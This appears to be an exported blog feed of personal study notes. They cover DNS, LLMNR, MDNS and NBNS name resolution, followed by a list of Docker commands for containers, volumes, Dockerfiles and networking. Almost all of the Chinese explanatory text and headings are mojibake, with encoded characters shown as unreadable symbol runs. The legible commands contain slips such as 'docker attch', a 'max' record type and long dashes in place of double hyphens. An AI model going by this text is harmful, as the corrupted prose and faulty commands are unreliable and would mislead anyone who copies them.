    <content><![CDATA[<h1 id="DNS-LLMNR-MDNS-NBNSåŸç†"><a href="#DNS-LLMNR-MDNS-NBNSåŸç†" class="headerlink" title="DNS\LLMNR\MDNS\NBNSåŸç†"></a>DNS\LLMNR\MDNS\NBNSåŸç†</h1><h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><p><a href="https://zhuanlan.zhihu.com/p/79350395">é¢è¯•å®˜:è®²è®²DNSçš„åŸç†ï¼Ÿ</a></p>
<p>åŸŸåè§£æè¿‡ç¨‹</p>
<p>æµè§ˆå™¨å…ˆåœ¨è‡ªå·±çš„ç¼“å­˜ä¸­æŸ¥æ‰¾æœ‰æ²¡æœ‰åŸŸåçš„è§£æï¼Œå¦‚æœæ²¡æœ‰åˆ™åˆ°ä¸»æœºçš„hostsæ–‡ä»¶ä¸­æ‰¾ï¼Œå¦‚æœä¹Ÿæ²¡æœ‰å°±åˆ°æœ¬åœ°dnsç¼“å­˜ä¸­å»æ‰¾ï¼Œå¦‚æœä¹Ÿæ²¡æœ‰å°±åˆ°æœ¬åœ°dnsæœåŠ¡å™¨å»æ‰¾ï¼Œå¦‚æœè¯¥åŸŸåä¸åœ¨æœ¬åœ°dnsæœåŠ¡å™¨è§£æçš„èŒƒå›´å†…ï¼Œä½†ç¼“å­˜ä¸­å·²ç»åŒ…å¥½äº†è¯¥è§£æåˆ™è¿”å›ipï¼Œæ­¤è§£æå…·æœ‰æƒå¨æ€§ï¼Œå¦‚æœè®¾ç½®äº†è½¬å‘æ¨¡å¼ï¼Œåˆ™å°†è¯¥æ¶ˆæ¯è½¬å‘åˆ°ä¸Šä¸€çº§è§£ææœåŠ¡å™¨ï¼Œå¦‚æœä»ä¸èƒ½è§£ææˆ–æ‰¾æ ¹æˆ–è€…ä¸Šä¸Šçº§ï¼Œå¦‚æœæ²¡æœ‰é…ç½®è§£æåˆ™è½¬å‘åˆ°13å°æ ¹æœåŠ¡å™¨ï¼Œæ ¹æœåŠ¡å™¨å†å‘Šè¯‰æœåŠ¡å™¨é¡¶çº§åŸŸæœåŠ¡å™¨çš„åœ°å€ï¼Œé¡¶çº§äºæœåŠ¡å™¨è¿”å›äºŒçº§åŸŸæœåŠ¡å™¨çš„åœ°å€ï¼Œè¿™æ ·ä¸€ç›´é€’å½’æŸ¥è¯¢ï¼Œç›´åˆ°æ‰¾åˆ°ä¸ºæ­¢ã€‚</p>
<p>dnsä½¿ç”¨çš„åè®®</p>
<p>dnsè§£ææ—¶ä½¿ç”¨udpåè®®</p>
<p>è§£ææ•°æ®æ•°æ®é‡è¾ƒå°ï¼Œä¸€èˆ¬ä¸è¶…è¿‡512å­—èŠ‚ï¼Œè§£æé€Ÿåº¦å¿«ï¼Œå¯¹ç¨³å®šæ€§è¦æ±‚ä¸é«˜</p>
<p>åŒºåŸŸä¼ é€æ—¶ä½¿ç”¨tcpåè®®</p>
<p>åŒºåŸŸé—´å¤åˆ¶ä¿¡æ¯ä¼ è¾“æ•°æ®é‡å¤§ï¼Œå¯¹ç¨³å®šæ€§çš„è¦æ±‚é«˜ã€‚</p>
<p>DNSçš„è§„èŒƒè§„å®šäº†2ç§ç±»å‹çš„DNSæœåŠ¡å™¨ï¼Œä¸€ä¸ªå«ä¸»DNSæœåŠ¡å™¨ï¼Œä¸€ä¸ªå«è¾…åŠ©DNSæœåŠ¡å™¨ã€‚åœ¨ä¸€ä¸ªåŒºä¸­ä¸»DNSæœåŠ¡å™¨ä»è‡ªå·±æœ¬æœºçš„æ•°æ®æ–‡ä»¶ä¸­è¯»å–è¯¥åŒºçš„DNSæ•°æ®ä¿¡æ¯ï¼Œè€Œè¾…åŠ©DNSæœåŠ¡å™¨åˆ™ä»åŒºçš„ä¸»DNSæœåŠ¡å™¨ä¸­è¯»å–è¯¥åŒºçš„DNSæ•°æ®ä¿¡æ¯ã€‚å½“ä¸€ä¸ªè¾…åŠ©DNSæœåŠ¡å™¨å¯åŠ¨æ—¶ï¼Œå®ƒéœ€è¦ä¸ä¸»DNSæœåŠ¡å™¨é€šä¿¡ï¼Œå¹¶åŠ è½½æ•°æ®ä¿¡æ¯ï¼Œè¿™å°±å«åšåŒºä¼ é€ï¼ˆzone transferï¼‰ã€‚ è¿™ç§æƒ…å†µä¸‹ï¼Œä½¿ç”¨TCPåè®®ã€‚</p>
<p>æŸ¥çœ‹åŸŸåè§£æè¿‡ç¨‹å‘½ä»¤</p>
<p>dig <a href="http://www.baidu.com/">www.baidu.com</a></p>
<p>dig +trace <a href="http://www.baidu.com/">www.baidu.com</a></p>
<p>èµ„æºè®°å½•RRç±»å‹</p>
<p>A</p>
<p>AAAA<br>PTR &#x2F;&#x2F;åå‘åŸŸåè§£æ</p>
<p>NS &#x2F;&#x2F;åŸŸåæœåŠ¡å™¨</p>
<p>cname <a href="//canonical">&#x2F;&#x2F;canonical</a> name è§„èŒƒå</p>
<p>max é‚®ä»¶äº¤æ¢</p>
<p>soa èµ·å§‹æˆæƒæœºæ„</p>
<p>åŸŸåè§£ææœåŠ¡å™¨åˆåˆ†ä¸ºæƒå¨åŸŸåæœåŠ¡å™¨ä¸é€’å½’è§£ææœåŠ¡å™¨ã€‚</p>
<p>FQDN-å®Œå…¨åˆæ ¼åŸŸå</p>
<p>ä»å®¢æˆ·ç«¯åˆ°æœ¬åœ°dnsæœåŠ¡å™¨æ˜¯è¿­ä»£æŸ¥è¯¢ï¼ŒdnsæœåŠ¡å™¨ä¹‹é—´çš„äº¤äº’æŸ¥è¯¢æ˜¯é€’å½’æŸ¥è¯¢f</p>
<p>CDN-å†…å®¹åˆ†å‘ç½‘ç»œ</p>
<p>å°†å†…å®¹ç¼“å­˜å†ç»ˆç«¯ç”¨æˆ·é™„è¿‘</p>
<p>å½“ç”¨æˆ·è®¿é—®ç½‘ç«™æ—¶ï¼Œåˆ©ç”¨å…¨å±€è´Ÿè½½æŠ€æœ¯ï¼Œå°†ç”¨æˆ·çš„è®¿é—®æŒ‡å‘è·ç¦»æœ€è¿‘çš„ç¼“å­˜æœåŠ¡å™¨ä¸Šï¼Œç”±ç¼“å­˜æœåŠ¡å™¨å“åº”ç”¨æˆ·è¯·æ±‚ã€‚</p>
<h1 id="LLMNR"><a href="#LLMNR" class="headerlink" title="LLMNR"></a>LLMNR</h1><p>link-local multicast name resolution æœ¬åœ°é“¾æ¥å¤šè·¯åç§°è§£æ</p>
<p>å½“DNSæœåŠ¡ä¸å¯ç”¨æ—¶ï¼Œæœ¬åœ°ä¸»æœºå°±ä¼šä½¿ç”¨LLMNRåè®®æ¥è¿›è¡Œåç§°è§£æï¼Œé€šè¿‡UDPåè®®å‘224.0.0.252:5355ç»„æ’­åœ°å€å‘é€å¹¿æ’­ï¼Œæ¥è§£ææœ¬ç½‘æ®µä¸Šå¾—åç§°ï¼Œä½¿ç”¨çš„æ•°æ®åŒ…æ ¼å¼ä¸ä¼ ç»ŸDNSæ•°æ®åŒ…ä¸€è‡´ï¼Œå…¶ä¸ä»…èƒ½è§£æipv4çš„åœ°å€åŒæ ·ä¹Ÿèƒ½è§£æipv6çš„åè®®ï¼Œã€‚ä¸LLMNRç›¸ä¼¼çš„å¦ä¸€ç§åè®®æ˜¯MDNSï¼Œå…¶å¤šæ’­åœ°å€ä¸º224.0.0.251:5353ã€‚</p>
<h2 id="å·¥ä½œè¿‡ç¨‹"><a href="#å·¥ä½œè¿‡ç¨‹" class="headerlink" title="å·¥ä½œè¿‡ç¨‹"></a>å·¥ä½œè¿‡ç¨‹</h2><p>ä¸»æœºåœ¨è‡ªå·±çš„å†…éƒ¨åç§°ç¼“å­˜ä¸­æŸ¥è¯¢åç§°ã€‚å¦‚æœåœ¨ç¼“å­˜ä¸­æ²¡æœ‰æ‰¾åˆ°äº†åç§°ï¼Œé‚£ä¹ˆä¸»æœºå°±ä¼šå‘è‡ªå·±é…ç½®çš„ä¸»DNSæœåŠ¡å™¨å‘é€æŸ¥è¯¢è¯·æ±‚ã€‚å¦‚æœä¸»æœºæ²¡æœ‰æ”¶åˆ°å›åº”æˆ–æ”¶åˆ°äº†é”™è¯¯ä¿¡æ¯ï¼Œä¸»æœºè¿˜ä¼šå°è¯•æœç´¢é…ç½®çš„å¤‡ç”¨DNSæœåŠ¡å™¨ã€‚å¦‚æœä¸»æœºæ²¡æœ‰é…ç½®DNSæœåŠ¡å™¨ï¼Œæˆ–è€…å¦‚æœåœ¨è¿æ¥DNSæœåŠ¡å™¨çš„æ—¶å€™æ²¡æœ‰é‡åˆ°é”™è¯¯ä½†å¤±è´¥äº†ï¼Œé‚£ä¹ˆåç§°è§£æä¼šå¤±è´¥ï¼Œå¹¶è½¬ä¸ºä½¿ç”¨LLMNRã€‚</p>
<p>ä¸»æœºé€šè¿‡ç”¨æˆ·æ•°æ®æŠ¥åè®®(UDP)å‘é€å¤šæ’­æŸ¥è¯¢ï¼ŒæŸ¥è¯¢ä¸»æœºåå¯¹åº”çš„IPåœ°å€ï¼Œè¿™ä¸ªæŸ¥è¯¢ä¼šè¢«é™åˆ¶åœ¨æœ¬åœ°å­ç½‘(ä¹Ÿå°±æ˜¯æ‰€è°“çš„é“¾è·¯å±€éƒ¨)å†…ã€‚</p>
<p>é“¾è·¯å±€éƒ¨èŒƒå›´å†…æ¯å°æ”¯æŒLLMNRï¼Œå¹¶ä¸”è¢«é…ç½®ä¸ºå“åº”ä¼ å…¥æŸ¥è¯¢çš„ä¸»æœºåœ¨æ”¶åˆ°è¿™ä¸ªæŸ¥è¯¢è¯·æ±‚åï¼Œä¼šå°†è¢«æŸ¥è¯¢çš„åç§°å’Œè‡ªå·±çš„ä¸»æœºåè¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœæ²¡æœ‰æ‰¾åˆ°åŒ¹é…çš„ä¸»æœºåï¼Œé‚£ä¹ˆè®¡ç®—æœºå°±ä¼šä¸¢å¼ƒè¿™ä¸ªæŸ¥è¯¢ã€‚å¦‚æœæ‰¾åˆ°äº†åŒ¹é…çš„ä¸»æœºåï¼Œè¿™å°è®¡ç®—æœºä¼šä¼ è¾“ä¸€æ¡åŒ…å«äº†è‡ªå·±IPåœ°å€çš„å•æ’­ä¿¡æ¯ç»™è¯·æ±‚è¯¥æŸ¥è¯¢çš„ä¸»æœºã€‚</p>
<h1 id="NBNS"><a href="#NBNS" class="headerlink" title="NBNS"></a>NBNS</h1><p>netbios-åç§°è§£æ</p>
]]></content>
      <categories>
        <category>å®‰å…¨æŠ€æœ¯</category>
        <category>åè®®è§„èŒƒ</category>
      </categories>
      <tags>
        <tag>DNS</tag>
        <tag>LLMNR</tag>
        <tag>MDNS</tag>
        <tag>NBNS</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker</title>
    <url>/archives/f5f9fa9b.html</url>
    <content><![CDATA[<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>docker é…ç½®æ–‡ä»¶åœ°å€ï¼š&#x2F;etc&#x2F;docker    daemon.json å…¶ä¸­å®šä¹‰é•œåƒä»“åº“ç­‰å…³é”®ä¿¡æ¯</p>
<p>docker info &#x2F;&#x2F;æŸ¥çœ‹dockerä¿¡æ¯</p>
<p>docker version &#x2F;&#x2F;æŸ¥çœ‹docker ç‰ˆæœ¬</p>
<p>docker run é•œåƒ &#x2F;&#x2F;è¿è¡Œé•œåƒ</p>
<p>â€”name &#x2F;&#x2F;ä¸ºå®¹å™¨å‘½å</p>
<p>-i &#x2F;&#x2F;äº¤äº’å¼è¿è¡Œ</p>
<p>-t &#x2F;&#x2F;æ‰“å¼€ä¸€ä¸ªç»ˆç«¯</p>
<p>-d &#x2F;&#x2F;åå°è¿è¡Œ</p>
<p>-rm &#x2F;&#x2F;æ¨å‡ºåé”€æ¯å®¹å™¨</p>
<p>-p ip:çœŸæœºç«¯å£ï¼šå®¹å™¨ç«¯å£ | åªå†™å®¹å™¨ç«¯å£| ä¸å†™-p ,ç›´æ¥å†™ç«¯å£</p>
<p>docker stats &#x2F;&#x2F;æŸ¥çœ‹dockerçŠ¶æ€</p>
<p>docker image ls &#x2F;&#x2F;åˆ—å‡ºæœ¬åœ°æ‰€æœ‰é•œåƒ</p>
<p>docker image pull &#x2F;&#x2F;æ‹‰å–ä¸€ä¸ªhubé•œåƒ</p>
<p>docker image inspect &#x2F;&#x2F;æŸ¥çœ‹é•œåƒçš„å…·ä½“ä¿¡æ¯</p>
<p>docker image push &#x2F;&#x2F;æ¨é€é•œåƒ</p>
<p>docker image load &#x2F;&#x2F;ä»åŒ…ä¸­åŠ è½½ä¸€ä¸ªé•œåƒ</p>
<p>docker image  save &#x2F;&#x2F;æ‰“åŒ…ä¸€ä¸ªé•œåƒ</p>
<p>docker image search httpd &#x2F;&#x2F;æœç´¢é•œåƒ</p>
<p>docker image  rmi é•œåƒå &#x2F;&#x2F;åˆ é™¤ä¸€ä¸ªé•œåƒ</p>
<p>docker ps -a &#x2F;&#x2F;æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„ä»¥åŠæ›¾ä»Šè¿è¡Œè¿‡çš„å®¹å™¨</p>
<p>-n&#x3D;1 &#x2F;&#x2F;æ˜¾ç¤ºæœ€è¿‘è¿è¡Œçš„å®¹å™¨ï¼Œæ•°å­—è¡¨ç¤ºä¸ªæ•°</p>
<p>-q   &#x2F;&#x2F;åªæ˜¾ç¤ºå®¹å™¨çš„ç¼–å·</p>
<p>exit &#x2F;&#x2F;åœæ­¢å¹¶é€€å‡ºå®¹å™¨</p>
<p>^+P+Q &#x2F;&#x2F;å®¹å™¨ä¸åœæ­¢é€€å‡º</p>
<p>docker rm -f $(docker  ps -qa) &#x2F;&#x2F;åˆ é™¤æ‰€æœ‰å®¹å™¨</p>
<p>docker rm  å®¹å™¨id &#x2F;&#x2F;åˆ é™¤ä¸€ä¸ªå®¹å™¨</p>
<p>docker inspect  å®¹å™¨id &#x2F;&#x2F;æŸ¥å®¹å™¨ä¿¡æ¯</p>
<p>docker stop å®¹å™¨id</p>
<p>docker restart å®¹å™¨id</p>
<p>docker stop å®¹å™¨id</p>
<p>docker kill  å®¹å™¨id</p>
<p>docker run </p>
<p>-d(åå°è¿è¡Œï¼Œè„±ç¦»çœŸæœºç»ˆç«¯) </p>
<p>-p 80:80 (çœŸæœºç«¯å£ï¼šå®¹å™¨ç«¯å£)  ä½¿å¤–éƒ¨å¯ä»¥è®¿é—®</p>
<p>-i (äº¤äº’å¼è¿è¡Œ) </p>
<p>-t (ç»ˆç«¯) </p>
<p>â€”rm(å½“å®¹å™¨å¤„äºé€€å‡ºçŠ¶æ€æ—¶è‡ªåŠ¨åˆ é™¤å®¹å™¨)</p>
<p>â€”name ä¸ºå®¹å™¨æŒ‡å®šåç§°</p>
<p>docker exec  -it å®¹å™¨ id &#x2F;bin&#x2F;bash  &#x2F;&#x2F;ç™»å½•å®¹å™¨</p>
<p>-c  â€œcount&#x3D;0;while true;do echo â€œ111â€;sleep 2;let count++if [ $count -gt 100;then return;fi];doneâ€ &#x2F;&#x2F;è¾“å…¥å‘½ä»¤</p>
<p>ä¸€ä¸ªå®¹å™¨ä¸­åªæœ‰ä¸€ä¸ªä¸»è¿›ç¨‹ï¼Œå¹¶ä¸€ç›´å æ®å®¹å™¨çš„ç»ˆç«¯</p>
<p>docker kill|stop  å®¹å™¨id &#x2F;&#x2F;åœæ­¢å®¹å™¨</p>
<p>docker rm -f å®¹å™¨id &#x2F;&#x2F;åˆ é™¤å®¹å™¨</p>
<p>docker top å®¹å™¨id &#x2F;&#x2F;æ˜¾ç¤ºèµ„æºå ç”¨ä¿¡æ¯</p>
<p>docker exec -it å®¹å™¨id shell &#x2F;&#x2F;è¿›å…¥æ­£åœ¨è¿è¡Œçš„å®¹å™¨ï¼Œå¹¶å¼€å¯ä¸€ä¸ªæ–°çš„ç»ˆç«¯ï¼Œé€€å‡ºåä¸ä¼šæ€æ­»å®¹å™¨</p>
<p>docker attch b2851800b493  &#x2F;&#x2F;è¿›å…¥å®¹å™¨ï¼Œä¸å¼€å¯ä¸€ä¸ªæ–°çš„ç»ˆç«¯ï¼Œæ¨å‡ºåä¼šæ€æ­»å®¹å™¨</p>
<p> docker cp å®¹å™¨id:å®¹å™¨å†…è·¯å¾„ ç›®çš„ä¸»æœºè·¯å¾„ &#x2F;&#x2F;ä»å®¹å™¨å†…å‘ä¸»æœºæ‹·è´æ•°æ®</p>
<p>docker pause å®¹å™¨id &#x2F;&#x2F;æš‚åœå®¹å™¨</p>
<p>docker unpause å®¹å™¨id &#x2F;&#x2F;åœæ­¢æš‚åœ</p>
<p>è‡ªå®šä¹‰é•œåƒ</p>
<p>method 1:</p>
<p>Dockerfile</p>
<p>method 2 :</p>
<p>æ‰“åŒ…ç°æœ‰æ–‡ä»¶</p>
<p>docker commit -m&#x3D;â€æè¿°ä¿¡æ¯â€ -a&#x3D;â€ä½œè€…â€ å®¹å™¨ID ç›®æ ‡é•œåƒå:tag</p>
<p>é•œåƒæ˜¯ä¸€ç§è½»é‡çº§çš„ã€å¯æ‰§è¡Œçš„ç‹¬ç«‹è½¯ä»¶åŒ…ï¼Œç”¨æ¥æ‰“åŒ…è½¯ä»¶å’Œè½¯ä»¶çš„è¿è¡Œç¯å¢ƒç­‰ï¼Œä»–åŒ…å«äº†è½¯ä»¶è¿è¡Œæ‰€éœ€è¦çš„æ‰€æœ‰çš„ä»£ç ã€åº“ã€ç¯å¢ƒå˜é‡ã€é…ç½®æ–‡ä»¶ç­‰</p>
<h1 id="dockeré•œåƒåŠ è½½åŸç†"><a href="#dockeré•œåƒåŠ è½½åŸç†" class="headerlink" title="dockeré•œåƒåŠ è½½åŸç†"></a>dockeré•œåƒåŠ è½½åŸç†</h1><h2 id="è”åˆæ–‡ä»¶ç³»ç»Ÿ-UFS"><a href="#è”åˆæ–‡ä»¶ç³»ç»Ÿ-UFS" class="headerlink" title="è”åˆæ–‡ä»¶ç³»ç»Ÿ-UFS"></a>è”åˆæ–‡ä»¶ç³»ç»Ÿ-UFS</h2><p>å°†æ–‡ä»¶åˆ†å±‚ç®¡ç†ï¼Œä¸å›¾å±‚æœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™ï¼Œå¯å°†æ–‡ä»¶çš„ä¿®æ”¹ä¸€å±‚ä¸€å±‚çš„å åŠ ï¼Œå¯å…±äº«ä¸€äº›å±‚ï¼Œä»è€ŒèŠ‚çº¦çš„å†…å­˜ä¸ç©ºé—´ï¼Œæ¯”å¦‚å®‰è£…mysqlä¸phpéƒ½éœ€è¦ç”¨åˆ°centosï¼Œåˆ™centosåªä¼šè¢«ä¸‹è½½ä¸€æ¬¡ï¼Œä¸éœ€è¦é‡å¤ä¸‹è½½</p>
<p>æˆ‘ä»¬å¯ä»¥è¿è¡Œä¸€ä¸ªdockerå®¹å™¨ï¼Œç„¶ååœ¨è¯¥å®¹å™¨ä¸­ä¿®æ”¹è‡ªå·±éœ€è¦çš„å•å…ƒï¼Œä¿®æ”¹åçš„å†…å®¹å¯ä»¥é€šè¿‡docker commit æ¥ä¿å­˜ä¸€ä¸ªæ–°çš„é•œåƒï¼Œæˆ‘ä»¬ä¿®æ”¹çš„éƒ¨åˆ†æˆä¸ºæ–°çš„ä¸€å±‚ã€‚</p>
<p>docker commit -a author -m describtion_info  å®¹å™¨id é•œåƒå:æ ‡ç­¾ -p åœ¨æ‰§è¡Œæ”¹å‘½ä»¤æ—¶æš‚åœå®¹å™¨ -c ä½¿ç”¨dockerfileåˆ›å»ºå®¹å™¨</p>
<h1 id="å®¹å™¨æ•°æ®å·"><a href="#å®¹å™¨æ•°æ®å·" class="headerlink" title="å®¹å™¨æ•°æ®å·"></a>å®¹å™¨æ•°æ®å·</h1><p>å®¹å™¨è¢«åˆ é™¤åï¼Œå…¶ä¸­ä¿å­˜çš„æ•°æ®å°±æ¶ˆå¤±äº†ï¼Œè¿™æ ·é£é™©å¤ªé«˜ï¼Œè¿™æ˜¯åéœ€è¦å°†æ•°æ®ä¿å­˜åœ¨åˆ«çš„åœ°æ–¹ï¼Œæˆ‘ä»¬é€šè¿‡å·æŠ€æœ¯æ¥å®ç°ï¼Œ</p>
<p>åŸç†å°±æ˜¯å°†å®¹å™¨å†…çš„æ•°æ®å…³è”åˆ°çœŸæœºä¸Šé¢ã€‚ä¸ä»…å¦‚æ­¤ï¼Œå®¹å™¨é—´ä¹Ÿå¯ä»¥å®ç°æ•°æ®å…±äº«</p>
<p>æ–¹å¼ä¸€ï¼š</p>
<p>docker  run -it -v ä¸»æœºç›®å½•åœ°å€: å®¹å™¨ç›®å½•åœ°å€ -v ä¸»æœºç›®å½•åœ°å€: å®¹å™¨ç›®å½•åœ°å€</p>
<p>å¯åŒæ—¶æŒ‚è½½å¤šä¸ªç›®å½•</p>
<p>åŒå‘ç»‘å®šï¼Œä¿®æ”¹ä»»ä¸€æ–¹çš„æ–‡ä»¶ï¼Œå¦ä¸€æ–¹å°†åŒæ—¶å˜åŒ–ï¼Œæ–‡ä»¶æ•°æ®å®é™…å­˜å‚¨åœ¨çœŸæœºä¸Šï¼Œåˆ é™¤å®¹å™¨åï¼Œæ•°æ®ä¸ä¼šä¸¢å¤±</p>
<p> å…·åæŒ‚è½½ï¼šæŒ‡å®šæŒ‚è½½å·çš„åç§°</p>
<p>åŒ¿åæŒ‚è½½ï¼šä¸æŒ‡å®šæŒ‚è½½å·çš„åç§°  </p>
<p>é»˜è®¤æŒ‚è½½è·¯å¾„ï¼š&#x2F;var&#x2F;lib&#x2F;docker&#x2F;volumes&#x2F;å·å&#x2F;_data&#x2F;</p>
<p>docker volume ls   &#x2F;&#x2F;æŸ¥çœ‹æ‰€æœ‰å·</p>
<p>-v å·å:å®¹å™¨å†…è·¯å¾„:ro|rw &#x2F;&#x2F;åªè¯»ï¼Œå¯è¯»å¯å†™          é’ˆå¯¹å®¹å™¨è€Œè¨€</p>
<p>æ–¹å¼äºŒï¼šdickerfile</p>
<p>æ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå†™å…¥ä¸€ä¸‹å†…å®¹</p>
<p>FROM centos &#x2F;&#x2F;åŸºç¡€é•œåƒ</p>
<p>VOLUME [â€œå®¹å™¨å†…ç›®å½•åœ°å€01â€,â€å®¹å™¨å†…ç›®å½•åœ°å€02â€]</p>
<p>CMD echo â€œ â€”â€”æŒ‚è½½å®Œæ¯•â€”â€”â€”â€œ</p>
<p>CMD   &#x2F;bin&#x2F;bash</p>
<p>æ‰§è¡Œï¼šdocker build -f  dockerfile_name -t armandhe&#x2F;centos(é•œåƒå) .</p>
<h2 id="æ•°æ®å·å®¹å™¨-å®¹å™¨ä¸å®¹å™¨å°†æ•°æ®åŒæ­¥"><a href="#æ•°æ®å·å®¹å™¨-å®¹å™¨ä¸å®¹å™¨å°†æ•°æ®åŒæ­¥" class="headerlink" title="æ•°æ®å·å®¹å™¨-å®¹å™¨ä¸å®¹å™¨å°†æ•°æ®åŒæ­¥"></a>æ•°æ®å·å®¹å™¨-å®¹å™¨ä¸å®¹å™¨å°†æ•°æ®åŒæ­¥</h2><p>åˆ›å»ºä¸‰ä¸ªå®¹å™¨â€”â€”â€”å®ç°äº†åŒä¸€åŠŸèƒ½çš„</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it  â€”name <span class="string">&quot;docker01&quot;</span> å®¹å™¨<span class="built_in">id</span>  //åˆ›å»ºçˆ¶å®¹å™¨</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it â€”name <span class="string">&quot;docker02&quot;</span> å®¹å™¨<span class="built_in">id</span> â€”volumes-from docker01 //åˆ›å»ºå­å®¹å™¨</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it â€”name <span class="string">&quot;docker03&quot;</span> å®¹å™¨<span class="built_in">id</span> â€”volumes-from docker01 //åˆ›å»ºå­å®¹å™¨</span><br></pre></td></tr></table></figure>

<p>ä¸‰ä¸ªå®¹å™¨å…±äº«æ•°æ®ï¼Œæ— è®ºåœ¨å“ªä¸€ä¸ªå®¹å™¨ä¸­æ–°å¢æ•°æ®ï¼Œå¦å¤–ä¸¤ä¸ªéƒ½ä¼šåŒæ­¥ã€‚åŒæ­¥çš„æ•°æ®åªæ˜¯é’ˆå¯¹æ•°æ®å·çš„ã€‚</p>
<h1 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h1><p>dockfile ä¸€è¡Œå‘½ä»¤å°±æ˜¯ä¸€å±‚ï¼Œå®šä¹‰äº†æ‰€æœ‰çš„æ­¥éª¤</p>
<p>dockerinages :é€šè¿‡dockerfileç”Ÿæˆçš„é•œåƒ</p>
<p>dockerå®¹å™¨ï¼šå®¹å™¨å°±æ˜¯è¿è¡Œèµ·æ¥çš„é•œåƒï¼Œé•œåƒä¸å®¹å™¨çš„å…³ç³»å°±åƒç±»ä¸å®ä¾‹çš„å…³ç³»</p>
<p>æ‰€æœ‰æŒ‡ä»¤å‡ä¸ºå¤§å†™</p>
<h2 id="dockerfileæŒ‡ä»¤"><a href="#dockerfileæŒ‡ä»¤" class="headerlink" title="dockerfileæŒ‡ä»¤"></a>dockerfileæŒ‡ä»¤</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM  //åŸºç¡€é•œåƒ</span><br><span class="line">MAINRAINER //ç»´æŠ¤è€…ä¿¡æ¯</span><br><span class="line">RUN //è¿è¡Œæ—¶çš„å‘½ä»¤</span><br><span class="line">ADD //æ­¥éª¤ï¼Œæ·»åŠ å†…å®¹</span><br><span class="line">WORKDIR //é•œåƒçš„å·¥ä½œç›®å½•</span><br><span class="line">VOLUME //å®¹å™¨å·</span><br><span class="line">EXPOSE //æŒ‡å®šæš´éœ²çš„ç«¯å£</span><br><span class="line">RUN //</span><br><span class="line">CMD //æŒ‡å®šå®¹å™¨å¯åŠ¨çš„æ—¶å€™éœ€è¦è¿è¡Œçš„å‘½ä»¤,åªæœ‰æœ€åä¸€ä¸ªä¼šç”Ÿæ•ˆï¼Œå¯è¢«æ›¿ä»£</span><br><span class="line">ENTRYPOINT //å’Œcmdç›¸ä¼¼ï¼Œä½†å¯è¿½åŠ å‘½ä»¤</span><br><span class="line">ONBULID //å½“æ„å»ºä¸€ä¸ªè¢«ç»§æ‰¿dockerfile è¿™ä¸ªæ—¶å€™å°±ä¼šè¿è¡Œæ”¹å‘½ä»¤</span><br><span class="line">COPY //ç±»ä¼¼addï¼Œå°†æ–‡ä»¶æ‹·è´åˆ°é•œåƒä¸­</span><br><span class="line">ENV //æ„å»ºçš„æ—¶å€™è®¾ç½®ç¯å¢ƒå˜é‡</span><br></pre></td></tr></table></figure>

<p>å‘å¸ƒé•œåƒ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker login -u dockerhub_name -p</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker tag reposity_name/images_name:tag</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker push tag</span><br></pre></td></tr></table></figure>

<h1 id="dockerç½‘ç»œåŸç†"><a href="#dockerç½‘ç»œåŸç†" class="headerlink" title="dockerç½‘ç»œåŸç†"></a>dockerç½‘ç»œåŸç†</h1><p>dockerå®‰è£…çš„æ—¶å€™ä¼šç”Ÿæˆå¼ docker0ç½‘å¡ï¼Œå……å½“æ‰€æœ‰å®¹å™¨çš„è·¯ç”±å™¨</p>
<p>evth-pair &#x2F;&#x2F;å……å½“æ¡¥æ¢æ¥è¿æ¥ä¸åŒçš„è™šæ‹Ÿè®¾å¤‡</p>
<p>ç”Ÿæˆä¸€ä¸ªå®¹å™¨çš„æ—¶å€™ä¼šæˆå¯¹å¾—ç”Ÿæˆevth-pairç½‘å¡ï¼Œä½¿å¾—å®¹å™¨ä¸å®¹å™¨ä¹‹é—´å¯ä»¥ç›¸äº’é€šä¿¡</p>
<p><img src="/archives/f5f9fa9b/Untitled.png"></p>
<p>æ‰€æœ‰çš„å®¹å™¨åœ¨ä¸æŒ‡å®šç½‘ç»œçš„æƒ…å†µä¸‹ï¼Œéƒ½æ˜¯ç”±docker0è¿›è¡Œè·¯ç”±çš„ï¼Œdockerä¼šä¸ºæ¯ä¸€ä¸ªå®¹å™¨åˆ†é…ä¸€ä¸ªå¯ç”¨çš„ip</p>
<p><img src="/Untitled%201.png"></p>
<p>ç‰©ç†æœºç½‘å¡ä¸dockeré€šè¿‡NATç›´è¿</p>
<h2 id="â€”link"><a href="#â€”link" class="headerlink" title="â€”link"></a>â€”link</h2><p>å®¹å™¨é‡å¯ä¹‹åï¼Œipåœ°å€å¯èƒ½å‘ç”Ÿå˜åŒ–ï¼Œé‚£ä¹ˆå®¹å™¨ä¹‹é—´é€šè¿‡ipè¿›è¡Œé€šä¿¡çš„è¯ï¼Œå°±éœ€è¦é‡æ–°è¿›è¡Œé…ç½®ï¼Œè¿™ä¸æ˜¯æˆ‘ä»¬éœ€è¦çš„æ•ˆæœã€‚æ‰€ä»¥é€šè¿‡â€”linkå°†ä¸¤ä¸ªå®¹å™¨è¿æ¥èµ·æ¥ï¼Œæ— è®ºipæ€ä¹ˆå˜åŒ–ï¼Œåªè¦å®¹å™¨çš„åç§°-æœåŠ¡åä¸å˜ï¼Œé‚£ä¹ˆä¸¤ä¸ªå®¹å™¨ä¹‹é—´å°±ä»ç„¶å¯ä»¥æ­£å¸¸é€šä¿¡ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -P â€”name <span class="string">&quot;tomcat01&quot;</span> tomcat</span><br></pre></td></tr></table></figure>

